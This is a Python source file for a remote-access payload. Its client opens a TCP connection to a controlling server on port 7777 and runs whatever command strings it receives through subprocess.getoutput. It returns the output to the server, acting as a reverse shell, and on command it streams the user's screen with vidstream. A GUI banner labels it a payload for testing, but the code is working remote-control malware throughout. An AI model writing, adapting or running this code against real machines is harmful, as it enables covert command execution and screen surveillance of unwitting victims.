import socket
import threading
import subprocess
import customtkinter
from vidstream import ScreenShareClient
import threading

class pay:    
    def __init__(self):    
        self.server_ip = socket.gethostbyname(socket.gethostname())
        self.server_port = 7777
        self.HEADER = 1024 
        self.FORMAT = 'utf-8'
        self.screenshare_client = None
        self.screenshare_thread = None

    def gui(self):
        self.ctk = customtkinter
        self.ctk.set_appearance_mode("System")
        self.ctk.set_default_color_theme("green")
        self.root = self.ctk.CTk()
        self.root.geometry("1270x720")
        self.root.title("BE SAFE")
        self.label = customtkinter.CTkLabel(master=self.root,text="THIS IS A PAYLOAD FOR TESTING , BE AWARE",font=("Arial", 32, "bold"))
        self.label.pack(pady=12, padx=10,expand=True)
        
        self.root.mainloop()
        
    def client_setup(self):    
        self.server_addr = (self.server_ip, self.server_port)
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect(self.server_addr)

    def screensharing(self):
        if self.screenshare_client is None:  
            self.screenshare_client = ScreenShareClient("127.0.0.1", 9999)
            self.screenshare_thread = threading.Thread(target=self.screenshare_client.start_stream)
            self.screenshare_thread.start()
    
    def screensharing_stop(self):
        if self.screenshare_client:  
            self.screenshare_client.stop_stream()
            if self.screenshare_thread:  
                self.screenshare_thread.join()
            self.screenshare_client = None
            self.screenshare_thread = None
    
    def recv(self):
        while True:
            cmd = self.client.recv(self.HEADER).decode(self.FORMAT)
            try:
                if cmd:
                    if cmd == "screenshare":
                        self.screensharing()
                    elif cmd == "scrnstop":  
                        self.screensharing_stop()
                    else:    
                        output = subprocess.getoutput(cmd)
                        self.client.send(output.encode(self.FORMAT))
            except:
                break

    def start(self):
        threading.Thread(target=self.gui, daemon=True).start()
        self.client_setup() 
        self.recv()
        

if __name__ == "__main__":
    app = pay()
    app.start()
